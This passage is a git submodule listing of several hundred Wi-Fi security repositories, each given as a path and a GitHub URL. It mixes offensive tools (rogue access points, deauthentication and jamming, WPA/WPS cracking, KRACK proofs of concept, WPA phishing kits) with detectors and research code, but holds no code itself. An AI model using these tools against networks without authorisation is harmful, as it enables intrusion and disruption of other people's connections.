\"Airvengers\"]\n\tpath = Airvengers\n\turl = https://github.com/hiteshchoudhary/Airvengers\n[submodule \"fake-ap3.py\"]\n\tpath = fake-ap3.py\n\turl = https://github.com/awhitehatter/fake-ap3.py\n[submodule \"Wifi_Trojans\"]\n\tpath = Wifi_Trojans\n\turl = https://github.com/ahhh/Wifi_Trojans\n[submodule \"wireless_RSSI\"]\n\tpath = wireless_RSSI\n\turl = https://github.com/agnostino/wireless_RSSI\n[submodule \"rogueap\"]\n\tpath = rogueap\n\turl = https://github.com/bram-glasswall/rogueap\n[submodule \"dockerfile-hostapd\"]\n\tpath = dockerfile-hostapd\n\turl = https://github.com/dweinstein/dockerfile-hostapd\n[submodule \"cupid\"]\n\tpath = cupid\n\turl = https://github.com/lgrangeia/cupid\n[submodule \"hostapd-wpe-extended\"]\n\tpath = hostapd-wpe-extended\n\turl = https://github.com/NerdyProjects/hostapd-wpe-extended\n[submodule \"hostapd-acs\"]\n\tpath = hostapd-acs\n\turl = https://github.com/swaminathanvasanth/hostapd-acs\n[submodule \"connme\"]\n\tpath = connme\n\turl = https://github.com/kurokid/connme\n[submodule \"wifi-ap\"]\n\tpath = wifi-ap\n\turl = https://github.com/foosel/wifi-ap\n[submodule \"zarp\"]\n\tpath = zarp\n\turl = https://github.com/hatRiot/zarp\n[submodule \"EvilAP_Defender\"]\n\tpath = EvilAP_Defender\n\turl = https://github.com/moha99sa/EvilAP_Defender\n[submodule \"BitcoinWifi\"]\n\tpath = BitcoinWifi\n\turl = https://github.com/ragmondo/BitcoinWifi\n[submodule \"milicone\"]\n\tpath = milicone\n\turl = https://github.com/jazoza/milicone\n[submodule \"gtaiad\"]\n\tpath = gtaiad\n\turl = https://github.com/jedivind/gtaiad\n[submodule \"como\"]\n\tpath = como\n\turl = https://github.com/JackieXie168/como\n[submodule \"madwifi-hopping\"]\n\tpath = madwifi-hopping\n\turl = https://github.com/paulpatras/madwifi-hopping\n[submodule \"openwifimap-api\"]\n\tpath = openwifimap-api\n\turl = https://github.com/freifunk/openwifimap-api\n[submodule \"PyScapy\"]\n\tpath = PyScapy\n\turl = https://github.com/ogreworld/PyScapy\n[submodule \"aircrack-ng-iphone\"]\n\tpath = aircrack-ng-iphone\n\turl = https://github.com/jedivind/aircrack-ng-iphone\n[submodule \"AIRBASE-NG-SSLSTRIP-AIRSTRIP\"]\n\tpath = AIRBASE-NG-SSLSTRIP-AIRSTRIP\n\turl = https://github.com/hacker404/AIRBASE-NG-SSLSTRIP-AIRSTRIP-\n[submodule \"killosx\"]\n\tpath = killosx\n\turl = https://github.com/d4rkcat/killosx\n[submodule \"HandShaker\"]\n\tpath = HandShaker\n\turl = https://github.com/d4rkcat/HandShaker\n[submodule \"apflood\"]\n\tpath = apflood\n\turl = https://github.com/d4rkcat/apflood\n[submodule \"MulitFi\"]\n\tpath = MulitFi\n\turl = https://github.com/shpala/MulitFi\n[submodule \"mitm-helper-wifi\"]\n\tpath = mitm-helper-wifi\n\turl = https://github.com/jakev/mitm-helper-wifi\n[submodule \"hotspotd\"]\n\tpath = hotspotd\n\turl = https://github.com/0x90/hotspotd\n[submodule \"wifiScanMap\"]\n\tpath = wifiScanMap\n\turl = https://github.com/mehdilauters/wifiScanMap\n[submodule \"marfil\"]\n\tpath = marfil\n\turl = https://github.com/pupi1985/marfil\n[submodule \"sly-fi\"]\n\tpath = sly-fi\n\turl = https://github.com/sinistermachine/sly-fi\n[submodule \"wiwo\"]\n\tpath = wiwo\n\turl = https://github.com/CoreSecurity/wiwo\n[submodule \"curscout\"]\n\tpath = curscout\n\turl = https://github.com/bennett-elder/curscout\n[submodule \"smoothie\"]\n\tpath = smoothie\n\turl = https://github.com/XayOn/smoothie\n[submodule \"pyrcrack\"]\n\tpath = pyrcrack\n\turl = https://github.com/XayOn/pyrcrack\n[submodule \"wireless\"]\n\tpath = wireless\n\turl = https://github.com/joshvillbrandt/wireless\n[submodule \"osx-wifi-scan\"]\n\tpath = osx-wifi-scan\n\turl = https://github.com/kornysietsma/osx-wifi-scan\n[submodule \"3WiFi\"]\n\tpath = 3WiFi\n\turl = https://github.com/binarymaster/3WiFi\n[submodule \"WiFi-Pumpkin\"]\n\tpath = WiFi-Pumpkin\n\turl = https://github.com/P0cL4bs/WiFi-Pumpkin.git\n[submodule \"airgeddon\"]\n\tpath = airgeddon\n\turl = https://github.com/v1s1t0r1sh3r3/airgeddon\n[submodule \"call-for-wpa3\"]\n\tpath = call-for-wpa3\n\turl = https://github.com/d33tah/call-for-wpa3\n[submodule \"wi-door\"]\n\tpath = wi-door\n\turl = https://github.com/Vivek-Ramachandran/wi-door\n[submodule \"uploadwpa\"]\n\tpath = uploadwpa\n\turl = https://github.com/Alf-Alfa/uploadwpa\n[submodule \"monmob\"]\n\tpath = monmob\n\turl = https://github.com/tuter/monmob\n[submodule \"moepdefend\"]\n\tpath = moepdefend\n\turl = https://github.com/moepinet/moepdefend\n[submodule \"kismet-fork\"]\n\tpath = kismet-fork\n\turl = https://github.com/ymah/kismet-fork\n[submodule \"hijack\"]\n\tpath = hijack\n\turl = https://github.com/0x0d/hijack\n[submodule \"airodump_mod\"]\n\tpath = airodump_mod\n\turl = https://github.com/maroviher/airodump_mod\n[submodule \"linssid\"]\n\tpath = linssid\n\turl = https://github.com/luigino/linssid\n[submodule \"bully\"]\n\tpath = bully\n\turl = https://github.com/aanarchyy/bully\n[submodule \"crda-ct\"]\n\tpath = crda-ct\n\turl = https://github.com/0x90/crda-ct\n[submodule \"iwraw\"]\n\tpath = iwraw\n\turl = https://github.com/erstrom/iwraw\n[submodule \"mitm-rogue-WiFi-AP\"]\n\tpath = mitm-rogue-WiFi-AP\n\turl = https://github.com/wshen0123/mitm-rogue-WiFi-AP\n[submodule \"mupe\"]\n\tpath = mupe\n\turl = https://github.com/DE-IBH/mupe\n[submodule \"ap-notify\"]\n\tpath = ap-notify\n\turl = https://github.com/doctaweeks/ap-notify\n[submodule \"haircrack\"]\n\tpath = haircrack\n\turl = https://github.com/AdamKnube/haircrack\n[submodule \"create_ap\"]\n\tpath = create_ap\n\turl = https://github.com/oblique/create_ap\n[submodule \"win32wifi\"]\n\tpath = win32wifi\n\turl = https://github.com/almondg/win32wifi\n[submodule \"captiv8\"]\n\tpath = captiv8\n\turl = https://github.com/wraith-wireless/captiv8\n[submodule \"itamae\"]\n\tpath = itamae\n\turl = https://github.com/wraith-wireless/itamae\n[submodule \"aggr-inject\"]\n\tpath = aggr-inject\n\turl = https://github.com/rpp0/aggr-inject\n[submodule \"peapwn\"]\n\tpath = peapwn\n\turl = https://github.com/rpp0/peapwn\n[submodule \"kismet\"]\n\tpath = kismet\n\turl = https://github.com/kismetwireless/kismet\n[submodule \"kismetclient\"]\n\tpath = kismetclient\n\turl = https://github.com/PaulMcMillan/kismetclient\n[submodule \"mana\"]\n\tpath = mana\n\turl = https://github.com/sensepost/mana\n[submodule \"WHAT-PRO\"]\n\tpath = WHAT-PRO\n\turl = https://github.com/smoz1986/WHAT-PRO\n[submodule \"TCP-SeqNum\"]\n\tpath = TCP-SeqNum\n\turl = https://github.com/bwoolf1122/TCP-SeqNum\n[submodule \"Armory\"]\n\tpath = Armory\n\turl = https://github.com/justinbeatz/Armory\n[submodule \"Wifimon\"]\n\tpath = Wifimon\n\turl = https://github.com/Wifimon/Wifimon\n[submodule \"802.11p-iw\"]\n\tpath = 802.11p-iw\n\turl = https://github.com/CTU-IIG/802.11p-iw\n[submodule \"gr-ieee802-11\"]\n\tpath = gr-ieee802-11\n\turl = https://github.com/bastibl/gr-ieee802-11\n[submodule \"gr-ieee80211ah\"]\n\tpath = gr-ieee80211ah\n\turl = https://github.com/zitouni/gr-ieee80211ah\n[submodule \"WIG\"]\n\tpath = WIG\n\turl = https://github.com/6e726d/WIG\n[submodule \"cenarius\"]\n\tpath = cenarius\n\turl = https://github.com/adelashraf/cenarius\n[submodule \"libpcap-80211-c\"]\n\tpath = libpcap-80211-c\n\turl = https://github.com/weaknetlabs/libpcap-80211-c\n[submodule \"mac80211-user\"]\n\tpath = mac80211-user\n\turl = https://github.com/chillancezen/mac80211-user\n[submodule \"kismet-deauth-wpa2-handshake-plugin\"]\n\tpath = kismet-deauth-wpa2-handshake-plugin\n\turl = https://github.com/ph4r05/kismet-deauth-wpa2-handshake-plugin\n[submodule \"kismon\"]\n\tpath = kismon\n\turl = https://github.com/Kismon/kismon\n[submodule \"wifi-scan-new\"]\n\tpath = wifi-scan-new\n\turl = https://github.com/bmegli/wifi-scan\n[submodule \"USB-WiFi-Autoreset\"]\n\tpath = USB-WiFi-Autoreset\n\turl = https://github.com/jessebrizzi/USB-WiFi-Autoreset\n[submodule \"wifi_statistics\"]\n\tpath = wifi_statistics\n\turl = https://github.com/simonwunderlich/wifi_statistics\n[submodule \"wpe-parse\"]\n\tpath = wpe-parse\n\turl = https://github.com/sa7mon/wpe-parse\n[submodule \"Pyrit\"]\n\tpath = Pyrit\n\turl = https://github.com/JPaulMora/Pyrit\n[submodule \"bcm-public\"]\n\tpath = bcm-public\n\turl = https://github.com/seemoo-lab/bcm-public\n[submodule \"resfi\"]\n\tpath = resfi\n\turl = https://github.com/resfi/resfi\n[submodule \"bcm-rpi3\"]\n\tpath = bcm-rpi3\n\turl = https://github.com/seemoo-lab/bcm-rpi3\n[submodule \"mitmAP\"]\n\tpath = mitmAP\n\turl = https://github.com/xdavidhu/mitmAP\n[submodule \"Rollmac\"]\n\tpath = Rollmac\n\turl = https://github.com/violentshell/Rollmac\n[submodule \"802.11r\"]\n\tpath = 802.11r\n\turl = https://github.com/hd1de/802.11r\n[submodule \"AirPirate\"]\n\tpath = AirPirate\n\turl = https://github.com/gat3way/AirPirate\n[submodule \"react80211\"]\n\tpath = react80211\n\turl = https://github.com/fabriziogiuliano/react80211\n[submodule \"DeSniffer\"]\n\tpath = DeSniffer\n\turl = https://github.com/wirelesshack/DeSniffer\n[submodule \"802.11i-Analysis\"]\n\tpath = 802.11i-Analysis\n\turl = https://github.com/PeppeMir/802.11i-Analysis\n[submodule \"dw\"]\n\tpath = dw\n\turl = https://github.com/ndyakov/dw\n[submodule \"WiFi-802.11-Demo-Sniffer\"]\n\tpath = WiFi-802.11-Demo-Sniffer\n\turl = https://github.com/dcrisan/WiFi-802.11-Demo-Sniffer\n[submodule \"WiFi-Analyzer\"]\n\tpath = WiFi-Analyzer\n\turl = https://github.com/b00sti/WiFi-Analyzer\n[submodule \"Dot11Attacker\"]\n\tpath = Dot11Attacker\n\turl = https://github.com/haknmcaobin/Dot11Attacker\n[submodule \"libfcap\"]\n\tpath = libfcap\n\turl = https://github.com/teddyyy/libfcap\n[submodule \"NiFiCapture\"]\n\tpath = NiFiCapture\n\turl = https://github.com/CTurt/NiFiCapture\n[submodule \"disable-802.11b-snmp\"]\n\tpath = disable-802.11b-snmp\n\turl = https://github.com/claymichaels/disable-802.11b-snmp\n[submodule \"classIV\"]\n\tpath = classIV\n\turl = https://github.com/jkingsman/classIV\n[submodule \"SSIDentity\"]\n\tpath = SSIDentity\n\turl = https://github.com/SamClarke2012/SSIDentity\n[submodule \"801.11Project\"]\n\tpath = 801.11Project\n\turl = https://github.com/iceowl/801.11Project\n[submodule \"wlan-macos\"]\n\tpath = wlan-macos\n\turl = https://github.com/sbxfc/wlan-macos\n[submodule \"kismet_baro\"]\n\tpath = kismet_baro\n\turl = https://github.com/scottjpack/kismet_baro\n[submodule \"wobs\"]\n\tpath = wobs\n\turl = https://github.com/observ3r/wobs\n[submodule \"autokwaker\"]\n\tpath = autokwaker\n\turl = https://github.com/pasdesignal/autokwaker\n[submodule \"ScapyGELFtoGraylog2\"]\n\tpath = ScapyGELFtoGraylog2\n\turl = https://github.com/wouterbudding/ScapyGELFtoGraylog2\n[submodule \"wi5-aggregation\"]\n\tpath = wi5-aggregation\n\turl = https://github.com/Wi5/wi5-aggregation\n[submodule \"wifi-hacker\"]\n\tpath = wifi-hacker\n\turl = https://github.com/esc0rtd3w/wifi-hacker\n[submodule \"WHAT-Pi\"]\n\tpath = WHAT-Pi\n\turl = https://github.com/smoz1986/WHAT-Pi\n[submodule \"WHAT\"]\n\tpath = WHAT\n\turl = https://github.com/smoz1986/WHAT\n[submodule \"ath_spectral\"]\n\tpath = ath_spectral\n\turl = https://github.com/LorenzoBianconi/ath_spectral\n[submodule \"ieiit-kbp4111-80211\"]\n\tpath = ieiit-kbp4111-80211\n\turl = https://github.com/trama/ieiit-kbp4111-80211\n[submodule \"wbc-utils\"]\n\tpath = wbc-utils\n\turl = https://github.com/skullkey/wbc-utils\n[submodule \"Wave\"]\n\tpath = Wave\n\turl = https://github.com/hkparker/Wave\n[submodule \"Crippled\"]\n\tpath = Crippled\n\turl = https://github.com/Konsole512/Crippled\n[submodule \"hostapd-wpe-auto\"]\n\tpath = hostapd-wpe-auto\n\turl = https://github.com/risataimpt/hostapd-wpe\n[submodule \"parsecaps\"]\n\tpath = parsecaps\n\turl = https://github.com/sa7mon/parsecaps\n[submodule \"rogueap-launcher\"]\n\tpath = rogueap-launcher\n\turl = https://github.com/wouter-glasswall/rogueap\n[submodule \"startools\"]\n\tpath = startools\n\turl = https://github.com/sa7mon/startools\n[submodule \"WifiTrafficAnalyzer\"]\n\tpath = WifiTrafficAnalyzer\n\turl = https://github.com/Bob-King/WifiTrafficAnalyzer\n[submodule \"awesome-wifi-security\"]\n\tpath = awesome-wifi-security\n\turl = https://github.com/edelahozuah/awesome-wifi-security\n[submodule \"Side-channel\"]\n\tpath = Side-channel\n\turl = https://github.com/UtkMSNL/Side-channel\n[submodule \"WiFi-scheduling\"]\n\tpath = WiFi-scheduling\n\turl = https://github.com/UtkMSNL/WiFi-scheduling\n[submodule \"Hijacker\"]\n\tpath = Hijacker\n\turl = https://github.com/chrisk44/Hijacker\n[submodule \"Auto-mdk3_v02\"]\n\tpath = Auto-mdk3_v02\n\turl = https://github.com/Yokai-Seishinkage/Auto-mdk3_v02\n[submodule \"mass-deauth\"]\n\tpath = mass-deauth\n\turl = https://github.com/Andy-Maclachlan/mass-deauth\n[submodule \"mdk3_6.1\"]\n\tpath = mdk3_6.1\n\turl = https://github.com/ytisf/mdk3_6.1\n[submodule \"iStupid\"]\n\tpath = iStupid\n\turl = https://github.com/dinosec/iStupid\n[submodule \"mass-deauth-attack\"]\n\tpath = mass-deauth-attack\n\turl = https://github.com/shunghsiyu/mass-deauth-attack\n[submodule \"probr-analysis\"]\n\tpath = probr-analysis\n\turl = https://github.com/probr/probr-analysis\n[submodule \"probr-core\"]\n\tpath = probr-core\n\turl = https://github.com/probr/probr-core\n[submodule \"get-rssi\"]\n\tpath = get-rssi\n\turl = https://github.com/h3pr5tq/get-rssi\n[submodule \"accumulation-rssi\"]\n\tpath = accumulation-rssi\n\turl = https://github.com/h3pr5tq/accumulation-rssi\n[submodule \"geowifi\"]\n\tpath = geowifi\n\turl = https://github.com/yzfedora/geowifi\n[submodule \"wit\"]\n\tpath = wit\n\turl = https://github.com/substack/wit\n[submodule \"linux-wifi-tools\"]\n\tpath = linux-wifi-tools\n\turl = https://github.com/R2dR/linux-wifi-tools\n[submodule \"linux-wifi-reconnector\"]\n\tpath = linux-wifi-reconnector\n\turl = https://github.com/dcorking/linux-wifi-reconnector\n[submodule \"libuwifi\"]\n\tpath = libuwifi\n\turl = https://github.com/br101/libuwifi\n[submodule \"Wifi-Signal-Plotter\"]\n\tpath = Wifi-Signal-Plotter\n\turl = https://github.com/s7jones/Wifi-Signal-Plotter\n[submodule \"wime\"]\n\tpath = wime\n\turl = https://github.com/anburocky3/wime\n[submodule \"wirelessjammer\"]\n\tpath = wirelessjammer\n\turl = https://github.com/phr34k0/wirelessjammer\n[submodule \"WiPy\"]\n\tpath = WiPy\n\turl = https://github.com/bliz937/WiPy\n[submodule \"platform-hostapd\"]\n\tpath = platform-hostapd\n\turl = https://github.com/experimental-platform/platform-hostapd\n[submodule \"linux_wifi_config\"]\n\tpath = linux_wifi_config\n\turl = https://github.com/mytechia/linux_wifi_config\n[submodule \"airodump_mar_attack\"]\n\tpath = airodump_mar_attack\n\turl = https://github.com/maroviher/airodump_mar_attack\n[submodule \"Pwnstar9.0-for-WPA-Phishing\"]\n\tpath = Pwnstar9.0-for-WPA-Phishing\n\turl = https://github.com/musket33/Pwnstar9.0-for-WPA-Phishing\n[submodule \"zizzania\"]\n\tpath = zizzania\n\turl = https://github.com/cyrus-and/zizzania\n[submodule \"wifi-frequency-hacker\"]\n\tpath = wifi-frequency-hacker\n\turl = https://github.com/singe/wifi-frequency-hacker\n[submodule \"access_points\"]\n\tpath = access_points\n\turl = https://github.com/kootenpv/access_points\n[submodule \"whereami\"]\n\tpath = whereami\n\turl = https://github.com/kootenpv/whereami\n[submodule \"rollmac\"]\n\tpath = rollmac\n\turl = https://github.com/violentshell/rollmac\n[submodule \"linux-80211n-csitool\"]\n\tpath = linux-80211n-csitool\n\turl = https://github.com/dhalperi/linux-80211n-csitool\n[submodule \"Wifi-Dumper\"]\n\tpath = Wifi-Dumper\n\turl = https://github.com/Viralmaniar/Wifi-Dumper\n[submodule \"WifiDeauth\"]\n\tpath = WifiDeauth\n\turl = https://github.com/Revimal/WifiDeauth\n[submodule \"wpa2hc\"]\n\tpath = wpa2hc\n\turl = https://github.com/historypeats/wpa2hc\n[submodule \"WIRELESSINFO\"]\n\tpath = WIRELESSINFO\n\turl = https://github.com/rgupta9/WIRELESSINFO\n[submodule \"Wireless-forensics-framework\"]\n\tpath = Wireless-forensics-framework\n\turl = https://github.com/nipunjaswal/Wireless-forensics-framework\n[submodule \"disassociatedWiFi\"]\n\tpath = disassociatedWiFi\n\turl = https://github.com/bradleykirwan/disassociatedWiFi\n[submodule \"VistaRFmon\"]\n\tpath = VistaRFmon\n\turl = https://github.com/inguardians/VistaRFmon\n[submodule \"wifiJamMac\"]\n\tpath = wifiJamMac\n\turl = https://github.com/rajkotraja/wifiJamMac\n[submodule \"ee202a\"]\n\tpath = ee202a\n\turl = https://github.com/anchigel/ee202a\n[submodule \"Eircog\"]\n\tpath = Eircog\n\turl = https://github.com/nosmo/Eircog\n[submodule \"Aerial\"]\n\tpath = Aerial\n\turl = https://github.com/Nick-the-Greek/Aerial\n[submodule \"kali-wireless\"]\n\tpath = kali-wireless\n\turl = https://github.com/rringler/kali-wireless\n[submodule \"connect-wifi\"]\n\tpath = connect-wifi\n\turl = https://github.com/mousam05/connect-wifi\n[submodule \"wifi_based_population_estimator\"]\n\tpath = wifi_based_population_estimator\n\turl = https://github.com/siriuxy/wifi_based_population_estimator\n[submodule \"python3-wifi\"]\n\tpath = python3-wifi\n\turl = https://github.com/llazzaro/python3-wifi\n[submodule \"wifirxpower\"]\n\tpath = wifirxpower\n\turl = https://github.com/cnlohr/wifirxpower\n[submodule \"ofxSniffer\"]\n\tpath = ofxSniffer\n\turl = https://github.com/HalfdanJ/ofxSniffer\n[submodule \"wifi_monitor\"]\n\tpath = wifi_monitor\n\turl = https://github.com/dave5623/wifi_monitor\n[submodule \"wifispy\"]\n\tpath = wifispy\n\turl = https://github.com/Geovation/wifispy\n[submodule \"RadiusStats\"]\n\tpath = RadiusStats\n\turl = https://github.com/sillent/RadiusStats\n[submodule \"rifsniff\"]\n\tpath = rifsniff\n\turl = https://github.com/dappiu/rifsniff\n[submodule \"js-packet-injector\"]\n\tpath = js-packet-injector\n\turl = https://github.com/juzna/packet-injector\n[submodule \"RogueDetection\"]\n\tpath = RogueDetection\n\turl = https://github.com/baggybin/RogueDetection\n[submodule \"wifiscanvisualizer\"]\n\tpath = wifiscanvisualizer\n\turl = https://github.com/securitytube/wifiscanvisualizer\n[submodule \"JamWiFi\"]\n\tpath = JamWiFi\n\turl = https://github.com/unixpickle/JamWiFi\n[submodule \"libs/libuwifi\"]\n\tpath = libs/libuwifi\n\turl = https://github.com/br101/libuwifi\n[submodule \"autopwn/haircrack\"]\n\tpath = autopwn/haircrack\n\turl = https://github.com/AdamKnube/haircrack\n[submodule \"python-wireless-attacks\"]\n\tpath = python-wireless-attacks\n\turl = https://github.com/jordan-wright/python-wireless-attacks\n[submodule \"cherry\"]\n\tpath = cherry\n\turl = https://github.com/axilirator/cherry\n[submodule \"WiFi-autopwner\"]\n\tpath = WiFi-autopwner\n\turl = https://github.com/Mi-Al/WiFi-autopwner.git\n[submodule \"Python-Wi-Fi-Positioning-System\"]\n\tpath = Python-Wi-Fi-Positioning-System\n\turl = https://github.com/initbrain/Python-Wi-Fi-Positioning-System\n[submodule \"find-lf\"]\n\tpath = find-lf\n\turl = https://github.com/schollz/find-lf\n[submodule \"wifi-bruteforcer-fsecurify\"]\n\tpath = wifi-bruteforcer-fsecurify\n\turl = https://github.com/faizann24/wifi-bruteforcer-fsecurify\n[submodule \"WPSmash\"]\n\tpath = WPSmash\n\turl = https://github.com/DanMcInerney/WPSmash\n[submodule \"FreeWifi\"]\n\tpath = FreeWifi\n\turl = https://github.com/kylemcdonald/FreeWifi\n[submodule \"BRUTEIT\"]\n\tpath = BRUTEIT\n\turl = https://github.com/cyclo-techtwister/BRUTEIT\n[submodule \"Pwnstar9-0-for-Kali-2016R1-2\"]\n\tpath = Pwnstar9-0-for-Kali-2016R1-2\n\turl = https://github.com/musket33/Pwnstar9-0-for-Kali-2016R1-2\n[submodule \"KisMac2\"]\n\tpath = KisMac2\n\turl = https://github.com/IGRSoft/KisMac2\n[submodule \"wifite-openwrt\"]\n\tpath = wifite-openwrt\n\turl = https://github.com/kbeflo/wifite-openwrt\n[submodule \"osx-wificleaner\"]\n\tpath = osx-wificleaner\n\turl = https://github.com/mubix/osx-wificleaner\n[submodule \"whoishere.py\"]\n\tpath = whoishere.py\n\turl = https://github.com/hkm/whoishere.py\n[submodule \"WiBroute\"]\n\tpath = WiBroute\n\turl = https://github.com/Brom95/WiBroute\n[submodule \"Domain-WIFILocate\"]\n\tpath = Domain-WIFILocate\n\turl = https://github.com/killswitch-GUI/Domain-WIFILocate\n[submodule \"ath9k-4W-patch2\"]\n\tpath = ath9k-4W-patch2\n\turl = https://github.com/rboninsegna/ath9k-4W-patch\n[submodule \"RogueSploit\"]\n\tpath = RogueSploit\n\turl = https://github.com/B4ckP0r7/RogueSploit\n[submodule \"probeSniffer\"]\n\tpath = probeSniffer\n\turl = https://github.com/xdavidhu/probeSniffer\n[submodule \"netattack\"]\n\tpath = netattack\n\turl = https://github.com/chrizator/netattack\n[submodule \"hcxtools\"]\n\tpath = hcxtools\n\turl = https://github.com/ZerBea/hcxtools\n[submodule \"wifi-cracking\"]\n\tpath = wifi-cracking\n\turl = https://github.com/brannondorsey/wifi-cracking\n[submodule \"BoopSuite\"]\n\tpath = BoopSuite\n\turl = https://github.com/MisterBianco/BoopSuite\n[submodule \"wifikicker\"]\n\tpath = wifikicker\n\turl = https://github.com/viluhaxor/wifikicker\n[submodule \"WiFiStat\"]\n\tpath = WiFiStat\n\turl = https://github.com/MarkLalor/WiFiStat\n[submodule \"PiDense\"]\n\tpath = PiDense\n\turl = https://github.com/WiPi-Hunter/PiDense\n[submodule \"wifi-txpower-unlocker\"]\n\tpath = wifi-txpower-unlocker\n\turl = https://github.com/Manouchehri/wifi-txpower-unlocker\n[submodule \"packetEssentials\"]\n\tpath = packetEssentials\n\turl = https://github.com/ICSec/packetEssentials\n[submodule \"Chura-Liya\"]\n\tpath = Chura-Liya\n\turl = https://github.com/ICSec/Chura-Liya\n[submodule \"pyDot11\"]\n\tpath = pyDot11\n\turl = https://github.com/ICSec/pyDot11\n[submodule \"airpwn-ng\"]\n\tpath = airpwn-ng\n\turl = https://github.com/ICSec/airpwn-ng\n[submodule \"wavecrack\"]\n\tpath = wavecrack\n\turl = https://github.com/wavestone-cdt/wavecrack\n[submodule \"PiKarma\"]\n\tpath = PiKarma\n\turl = https://github.com/WiPi-Hunter/PiKarma\n[submodule \"PiSavar\"]\n\tpath = PiSavar\n\turl = https://github.com/WiPi-Hunter/PiSavar\n[submodule \"PiFinger\"]\n\tpath = PiFinger\n\turl = https://github.com/WiPi-Hunter/PiFinger\n[submodule \"WiFi-Miner-Detector\"]\n\tpath = WiFi-Miner-Detector\n\turl = https://github.com/360PegasusTeam/WiFi-Miner-Detector\n[submodule \"sparrow-wifi\"]\n\tpath = sparrow-wifi\n\turl = https://github.com/ghostop14/sparrow-wifi\n[submodule \"P4wnP1_WiFi_covert_channel_client\"]\n\tpath = P4wnP1_WiFi_covert_channel_client\n\turl = https://github.com/mame82/P4wnP1_WiFi_covert_channel_client\n[submodule \"WiFiJammer.py\"]\n\tpath = WiFiJammer.py\n\turl = https://github.com/hash3liZer/WiFiJammer.py\n[submodule \"WiFiBroot\"]\n\tpath = WiFiBroot\n\turl = https://github.com/hash3liZer/WiFiBroot\n[submodule \"airpydump\"]\n\tpath = airpydump\n\turl = https://github.com/hash3liZer/airpydump\n[submodule \"eaphammer\"]\n\tpath = eaphammer\n\turl = https://github.com/s0lst1c3/eaphammer\n[submodule \"PSKracker\"]\n\tpath = PSKracker\n\turl = https://github.com/soxrok2212/PSKracker\n[submodule \"wirespy\"]\n\tpath = wirespy\n\turl = https://github.com/AresS31/wirespy\n[submodule \"dwpa\"]\n\tpath = dwpa\n\turl = https://github.com/RealEnder/dwpa\n[submodule \"roguehostapd\"]\n\tpath = roguehostapd\n\turl = https://github.com/wifiphisher/roguehostapd\n[submodule \"probequest\"]\n\tpath = probequest\n\turl = https://github.com/SkypLabs/probequest\n[submodule \"rogue\"]\n\tpath = rogue\n\turl = https://github.com/InfamousSYN/rogue\n[submodule \"krackattacks-scripts\"]\n\tpath = krackattacks-scripts\n\turl = https://github.com/vanhoefm/krackattacks-scripts\n[submodule \"evilportals\"]\n\tpath = evilportals\n\turl = https://github.com/kbeflo/evilportals\n[submodule \"wifikill\"]\n\tpath = wifikill\n\turl = https://github.com/roglew/wifikill\n[submodule \"mdk4\"]\n\tpath = mdk4\n\turl = https://github.com/aircrack-ng/mdk4\n[submodule \"krackinfo\"]\n\tpath = krackinfo\n\turl = https://github.com/kristate/krackinfo\n[submodule \"krackdetector\"]\n\tpath = krackdetector\n\turl = https://github.com/securingsam/krackdetector\n[submodule \"KRACKDetection\"]\n\tpath = KRACKDetection\n\turl = https://github.com/IronMage/KRACKDetection\n[submodule \"krackattacks-poc-zerokey\"]\n\tpath = krackattacks-poc-zerokey\n\turl = https://github.com/vanhoefm/krackattacks-poc-zerokey\n[submodule \"Krack-wps\"]\n\tpath = Krack-wps\n\turl = https://github.com/Programmuser/Krack-wps\n[submodule \"KRACK-toolkit\"]\n\tpath = KRACK-toolkit\n\turl = https://github.com/omaidf/KRACK-toolkit\n[submodule \"WPA2-KRACK\"]\n\tpath = WPA2-KRACK\n\turl = https://github.com/jiansiting/WPA2-KRACK\n[submodule \"wpseyes\"]\n\tpath = wpseyes\n\turl = https://github.com/h4ckzard/wpseyes\n[submodule \"Thesis\"]\n\tpath = Thesis\n\turl = https://github.com/grazianomarallo/Thesis\n[submodule \"PCAP-CRACKER\"]\n\tpath = PCAP-CRACKER\n\turl = https://github.com/BroadbentT/PCAP-CRACKER\n[submodule \"krackattacks-Test-Vulnerability\"]\n\tpath = krackattacks-Test-Vulnerability\n\turl = https://github.com/p5panam/krackattacks-Test-Vulnerability\n[submodule \"krackattack-all-zero-tk-key\"]\n\tpath = krackattack-all-zero-tk-key\n\turl = https://github.com/lucascouto/krackattack-all-zero-tk-key\n[submodule \"KrackPlus\"]\n\tpath = KrackPlus\n\turl = https://github.com/fwalloe/KrackPlus\n[submodule \"KrackAttack\"]\n\tpath = KrackAttack\n\turl = https://github.com/Guppster/KrackAttack\n[submodule \"krack-poc\"]\n\tpath = krack-poc\n\turl = https://github.com/Hackndo/krack-poc\n[submodule \"KRACK\"]\n\tpath = KRACK\n\turl = https://github.com/chinatso/KRACK\n[submodule \"krackattacks-pineapple\"]\n\tpath = krackattacks-pineapple\n\turl = https://github.com/adde88/krackattacks-pineapple\n[submodule \"wifite2mod\"]\n\tpath = wifite2mod\n\turl = https://github.com/nuncan/wifite2mod\n[submodule \"wifite2-docker\"]\n\tpath = wifite2-docker\n\turl = https://github.com/random-robbie/wifite2-docker\n[submodule \"wifiteintaller\"]\n\tpath = wifiteintaller\n\turl = https://github.com/zonesecure/wifiteintaller\n[submodule \"WiFite2-RPi3-nexmon\"]\n\tpath = WiFite2-RPi3-nexmon\n\turl = https://github.com/awesome-pentest-gadgets/WiFite2-RPi3-nexmon\n[submodule \"CODEX\"]\n\tpath = CODEX\n\turl = https://github.com/DEADSEC-SECURITY/CODEX\n[submodule \"Tools-Airgeddon\"]\n\tpath = Tools-Airgeddon\n\turl = https://github.com/wahyu227/Tools-Airgeddon\n[submodule \"nabui\"]\n\tpath = nabui\n\turl = https://github.com/KhasMek/nabui\n[submodule \"ninjaberry\"]\n\tpath = ninjaberry\n\turl = https://github.com/mrusme/ninjaberry\n[submodule \"easy-bettercap\"]\n\tpath = easy-bettercap\n\turl = https://github.com/bootes-void/easy-bettercap\n[submodule \"krack\"]\n\tpath = krack\n\turl = https://github.com/tolgahanakgun/krack\n[submodule \"piwifipineapple\"]\n\tpath = piwifipineapple\n\turl = https://github.com/f1rsty/piwifipineapple.git\n[submodule \"PINEAPPLE\"]\n\tpath = PINEAPPLE\n\turl = https://github.com/charlieporth1/PINEAPPLE\n[submodule \"Wifi-Cracker\"]\n\tpath = Wifi-Cracker\n\turl = https://github.com/BadAppsDevelopment/Wifi-Cracker\n[submodule \"OneShot\"]\n\tpath = OneShot\n\turl = https://github.com/drygdryg/OneShot\n[submodule \"easy-hcx\"]\n\tpath = easy-hcx\n\turl = https://github.com/t3chnocat/easy-hcx\n[submodule \"pmkid-extractor\"]\n\tpath = pmkid-extractor\n\turl = 